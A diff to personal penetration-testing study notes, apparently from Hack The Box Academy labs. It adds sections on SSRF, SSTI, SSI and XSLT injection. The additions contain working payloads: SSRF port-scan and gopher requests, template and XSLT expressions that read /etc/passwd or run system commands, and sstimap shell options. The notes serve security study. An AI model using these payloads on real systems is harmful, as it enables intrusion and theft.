@@ -112,7 +112,7 @@ description:
 >/webroot/.htpasswd
 >```
 ## Exploits
-#### Cross-Site Scripting (XSS)
+### Cross-Site Scripting (XSS)
 
 >[!info]- Types of XSS vulnerabilities
 >XSS is caused by malicious user input of javascript code which causes subsequent page loads to include that malicious javascript code. Eg, malicious input into a comment box.
@@ -339,7 +339,7 @@ description:
 >
 >###### Have a Web Application Firewall (WAF)
 >It can automatically detect any type of inject going through HTTP requests and auto-reject those requests.
-#### SQLi
+### SQLi
 
 >[!info]- Types of SQLi
 >##### Boolean-based blind SQL injection
@@ -1288,6 +1288,379 @@ description:
 >And then `cat` the contents of the flag:
 >
 >![[Images/Pasted image 20250516061138.png]]
+### SSRF (Server Side Request Forgery)
 
+>[!code]- Discover the vulnerability (used throughout the below sections)
+>Imagine we have a website which lets us prompt the for the availability of company on a particular date:
+>
+>![[Images/Pasted image 20250521064822.png]]
+>
+>Doing so sends a POST request which includes a `dateserver` parameter and a `date` parameter. The response received is `available` in that particular instance:
+>
+>![[Images/Pasted image 20250521064917.png]]
+>
+>If we set the `dateserver` parameter to retrieve the server's own `index.php` file, we receive as a response the HTML for the index page:
+>
+>![[Images/Pasted image 20250521065032.png]]
+>
+>This suggests that the server is taking the value of the `dateserver` parameter and querying it, then sending back to us the response.
+>
+>Another example involves using the `dateserver` parameter to query one of the server's internal ports to see what response we get. The server returns a `failed to connect` error message, which suggests port 81 is closed:
+>
+>![[Images/Pasted image 20250521065230.png]]
 
+>[!code]- Port scan
+>The vulnerable POST request can cause the server to see whether a particular internal port is open or closed. In this example, the server returns a message which suggests its port 81 is closed:
+>
+>![[Images/Pasted image 20250521065343.png]]
+>
+>Create a txt file containing numbers up to 10,000:
+>```powershell
+>seq 1 10000 > ports.txt
+>```
+>
+>Perform a fuzz of the port number using the SSRF vulnerability:
+>```powershell
+># Fuzz top 10,000 ports
+># Filter requests containing 'Faield to connect to'
+>ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
+>```
+>
+>>[!exploit]- Example (Hack The Box Academy)
+>>The web server contains a button to see whether there is availability on a certain day. Clicking the `Check Availability` button submits a POST request, with the request data containing a `dateserver` value:
+>>
+>>![[Images/Pasted image 20250523054922.png]]
+>>
+>>![[Images/Pasted image 20250523055006.png]]
+>>
+>>If we assume the web server is receiving a response from whatever server is defined within this `dateserver` value, we can change the server to one that might not exist, to see what response we get:
+>>
+>>![[Images/Pasted image 20250523055214.png]]
+>>
+>>We can fuzz the top 10,000 ports to attempt to see which ones are open and which are closed (like port 12345 is):
+>>
+>>![[Images/Pasted image 20250523055308.png]]
+>>
+>>This fuzz scan suggests port 3306 and 8000 are internal ports which are open. We can set the `dateserver` value to query the internal port `8000` to see what response we get (we get the flag):
+>>
+>>![[Images/Pasted image 20250523055157.png]]
+
+>[!code]- Accessing files
+>Fuzz for directories available on the `dateserver.htb` server:
+>```powershell
+>ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
+>```
+>
+>Fuzz for files outside the web server (or the web server's app source files):
+>```powershell
+>dateserver=file:///etc/passwd&date=2024-01-01
+>```
+>>[!exploit]- Example (Hack The Box)
+>>We access the `admin.php` web page on the `dateserver.htb` server, via the SSRF vulnerability. Without the SSRF vulnerability we wouldn't be able to reach the `dateserver.htb` server.
+>>
+>>![[Images/Pasted image 20250523070325.png]]
+
+>[!code]- Accessing other internal services via the gopher protocol
+>>[!info]- Overcoming GET-based SSRF vulnerability limitations
+>>Sometimes a service is found which requires us to send POST data to it in order to access it. For example, if we found an `admin.php` login portal on an internal HTTP server, we wouldn't typically be able to fuzz the credentials via a GET request. The Gopher protocol, however, lets us send POST-like data in a GET request. The receiving service has to have a Gopher compiler for this approach to work.
+>
+>If we want to send this POST request via the GET-based SSRF vulnerability (`dateserver=http://dateserver.htb/data-to-send-here&date=2024-01-01`):
+>```powershell
+>POST /admin.php HTTP/1.1
+>Host: dateserver.htb
+>Content-Length: 13
+>Content-Type: application/x-www-form-urlencoded
+>
+>adminpw=admin
+>
+>```
+>We can convert it into a gopher request:
+>- URL encode all special characters (including spaces (`%20`) and newlines (`%0D%0A`))
+>- Prefix the data with the gopher URL scheme, the target host and port, and an underscore:
+>  
+>>[!tip]- Converting a POST request into the Gopher format can be done automatically using the [Gopherus](https://github.com/tarunkant/Gopherus) tool. It supports the creation of URLs for the following services:
+>>MySQL
+>>PostgreSQL
+>>FastCGI
+>>Redis
+>>SMTP
+>>Zabbix
+>>pymemcache
+>>rbmemcache
+>>phpmemcache
+>>dmpmemcache
+>  
+>```powershell
+>gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
+>```
+>
+>We'll probably need to URL-encode again the whole URL above before setting it as the value for the `dateserver` parameter, to ensure its delivered as intended to the Gopher protocol handler:
+>
+>```powershell
+>dateserver=gopher%3a//dateserver.htb%3a80/\_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
+>```
+>
+>To run Gopherus:
+>```powershell
+>python2.7 gopherus.py --exploit smtp
+>```
+>
+>![[Images/Pasted image 20250523063441.png]]
+
+>[!code]- Blind SSRF
+>Occurs when the response to a SSRF vulnerability is not directly displayed to us.
+>
+>For example, the web app does not include the HTML response of the coerced request. Instead, it simply lets us know that the date is unavailable:
+>
+>![[Images/Pasted image 20250715063506.png]]
+>
+>We can use Blind SSRF if the response differs at least somewhat. For example, when doing a port scan, a close port generates the message `Something went wrong!`.
+>
+>![[Images/Pasted image 20250715063706.png]]
+>
+>Whereas an open port generates the message `Date is unavailable. Please choose a different date!`.
+>
+>![[Images/Pasted image 20250715063716.png]]
+>
+>>[!exploit]- Example (blind SSRF to show two open ports)
+>>The responses were filtered based on their content.
+>>![[Images/Pasted image 20250715075209.png]]
+
+>[!code]- Prevention
+>- Whitelist of acceptable remote data sources
+>- Restrict the URL scheme in the request (to disable gopher requests)
+>- Input sanitisation
+>- Firewall rules prevent requests to significant systems
+>- Network segmentation can prevent access to other systems
+### SSTI (Server Side Template Injection)
+
+>[!info]- Templating & SSTI
+>###### Templating
+>A template engine is software that combines pre-defined templates to dynamically generate data to be served by the web server. It also allows the injection of variables and objects. For example:
+>
+>1. Having a footer or header coded once, it can then be injected into any other web page dynamically
+>2. Having a list of names and using a for loop to output them
+>   
+>![[Images/Pasted image 20250715080623.png]]
+>
+>###### SSTI
+>An attacker injects code into a template that is later rendered by the server. If the injected code is malicious, the server potentially executes the code during the rendering process.
+>
+>SSTI can occur when user input is injected into the template string, rather than after the template has been rendered. This allows an attacker to manipulate what the server renders.
+
+>[!code]- Identify SSTI
+>###### Manually
+>Inject a payload consisting of a string which contains chars typically used by templating engines:
+>
+>![[Images/Pasted image 20250715082003.png]]
+>
+>>[!code]- Webpage with a SSTI vulnerability
+>>![[Images/Pasted image 20250715082054.png]]
+>
+>Injecting the above mentioned payload gives an error:
+>
+>![[Images/Pasted image 20250715082213.png]]
+>
+>###### Automatically (tplmap)
+>```powershell
+>python3 sstimap.py -u http://172.17.0.2/index.php?name=test
+>
+># Download a remote file to local machine
+>python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
+>
+># Execute a system command
+>python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
+>
+># Obtain an interactive shell
+>python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
+>```
+>>[!code]- Example (stimap.py -u http://172.17.0.2/index.php?name=test)
+>>![[Images/Pasted image 20250717063724.png]]
+>
+
+>[!code]- Identify the templating engine
+>The successful injection of certain strings can lead us to identify the templating engine in effect (follow green arrow for success, red for failure):
+>
+>![[Images/Pasted image 20250715082403.png]]
+>
+>`{{7*'7'}}` will equal `7777777` with Jinja and `49` with Twig
+>
+>>[!code]- Example of using the graph
+>>![[Images/Pasted image 20250715082538.png]]
+
+>[!code]- PayloadsAllTheThings - SSTI
+>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md
+
+>[!code]- Exploiting SSTI (Jinja2)
+>###### Information Disclosure
+>```powershell
+>{{ config.items() }} # config file
+>```
+>>[!code]- Result
+>>![[Images/Pasted image 20250715085544.png]]
+>
+>```powershell
+>{{ self.__init__.__globals__.__builtins__ }} # reveal Python variables and built-in functions
+>```
+>>[!code]- Result
+>>![[Images/Pasted image 20250715085645.png]]
+>
+>###### Local File Inclusion (LFI)
+>```python
+>{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }} # python
+>```
+>>[!code]- Result
+>>![[Images/Pasted image 20250715085827.png]]
+>
+>###### Remote Code Execution
+>```python
+>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} # python
+>```
+>>[!code]- Result
+>>![[Images/Pasted image 20250715090028.png]]
+
+>[!code]- Exploiting SSTI (Twig)
+>###### Information Disclosure
+>```python
+>{{ \_self }} # (without the backslash) get info about current template
+>```
+>>[!code]- Example
+>>![[Images/Pasted image 20250717062827.png]]
+>
+>###### Local File Inclusion
+>Twig doesn't directly have an internal function to read files, but the PHP web framework Symfony does due to it defining additional Twig filters.
+>```python
+>{{ "/etc/passwd"|file_excerpt(1,-1) }}
+>```
+>>[!code]- Example
+>>![[Images/Pasted image 20250717063046.png]]
+>
+>###### Remote Code Execution
+>```python
+>{{ ['id'] | filter('system') }} # use PHP's built-in system function
+>```
+>>[!code]- Example
+>>![[Images/Pasted image 20250717063252.png]]
+### SSI (Server-Side Includes)
+
+>[!info]- Information
+>###### Background
+>SSI is a web technology to create dynamic content on HTML pages. The use of SSI can often be inferred from the file extensions (`.shtml`, .`shtm`, `stm`). But web servers can be configured to support SSI directives in arbitrary file extensions.
+>
+>###### SSI Directives
+>SSI uses directives to dynamically generate content to a static HTML page. These directives consist of:
+>- name (the directives name)
+>- parameter name (one or more parameters)
+>- value (one or more parameter values)
+>  
+>```html
+># General directive format
+><!--#name param1="value1" param2="value" -->
+>
+># Examples
+>
+># prints the environmental variables
+><!--#printenv -->
+>
+># changes the SSI configuration, for example, changing the default error message
+><!--#config errmsg="Error!" -->
+>
+># prints the value of any variable
+><!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->
+>
+># executes the command in the cmd parameter
+><!--#exec cmd="whoami" -->
+>
+># includes the file specified in the virtual parameter
+><!--#include virtual="index.html" -->
+>```
+
+>[!code]- Exploit SSI
+>###### Identify
+>We find the following webpage:
+>![[Images/Pasted image 20250717070348.png]]
+>
+>After we enter our name into the text box, we get directed to `/page.shtml`
+>![[Images/Pasted image 20250717070414.png]]
+>
+>###### Exploit
+>If we enter `<!--#printenv -->` into the text box, we get:
+>![[Images/Pasted image 20250717070514.png]]
+>
+>If we enter `<!--#exec cmd="id" -->`, we get:
+>![[Images/Pasted image 20250717070601.png]]
+### XSLT Injection (eXtensible Stylesheet Language Transformation Injection)
+
+>[!info]- Information
+>XSLT is a language enabling the transformation of XML documents. For example, it can select specific nodes from an XML document and change the XML structure.
+>
+>XSLT data is structured similarly to XML, but it contain XSL elements within nodes prefixed with `xsl`. Common XSL elements include:
+>- `<xls:template>` indicates an XSL template
+>- `<xsl:value-of>` extracts the value of the XML node specified within the `select` attribute
+>- `<xsl:for-each>` enables looping over all XML nodes specified in the `select` attribute
+>
+>>[!code]- Example XSLT data
+>>Example XML document:
+>>
+>>![[Images/Pasted image 20250717071537.png]]
+>>
+>>Example XSLT document. It is used to output all fruits contained within the XML document as well as their colour:
+>>
+>>![[Images/Pasted image 20250717071447.png]]
+>>
+>>The output would be:
+>>```
+>>Here are all the fruits:
+>>   Apple (Red)
+>>   Banana (Yellow)
+>>   Strawberry (Red)
+>>```
+
+>[!code]- Identifying & Exploiting
+>>[!code]- Identifying XSLT Injection
+>>A sample web app displays basic information about Academy modules:
+>>
+>>![[Images/Pasted image 20250717072010.png]]
+>>
+>>At the bottom of the page we can provide a username which is then inserted into the headline at the top of the list:
+>>
+>>![[Images/Pasted image 20250717072037.png]]
+>>
+>>If we suppose our input is being injected directly into a XSLT file, we may be able to manipulate the output. Entering a broken XML tag causes an error 500:
+>>
+>>![[Images/Pasted image 20250717072228.png]]
+>
+>###### Information Disclosure
+>```html
+># Inject these XSLT elements:
+>Version: <xsl:value-of select="system-property('xsl:version')" />
+><br/>
+>Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
+><br/>
+>Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
+><br/>
+>Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
+><br/>
+>Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
+>```
+>>[!code]- Result
+>>![[Images/Pasted image 20250717072519.png]]
+>
+>###### Local File Inclusion
+>Whether a payload will work will depend upon the XSLT version and the configuration of the XSLT library.
+>```html
+><xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
+>
+><xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
+>```
+>>[!code]- Result (<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />)
+>>![[Images/Pasted image 20250717073258.png]]
+>>
+>###### Remote Code Execution
+>If the XSLT processor support PHP functions, we can call a PHP function that executes local system command.
+>```xml
+><xsl:value-of select="php:function('system','id')" />
+>```
+>>[!code]- Result
+>>![[Images/Pasted image 20250717073426.png]]
 
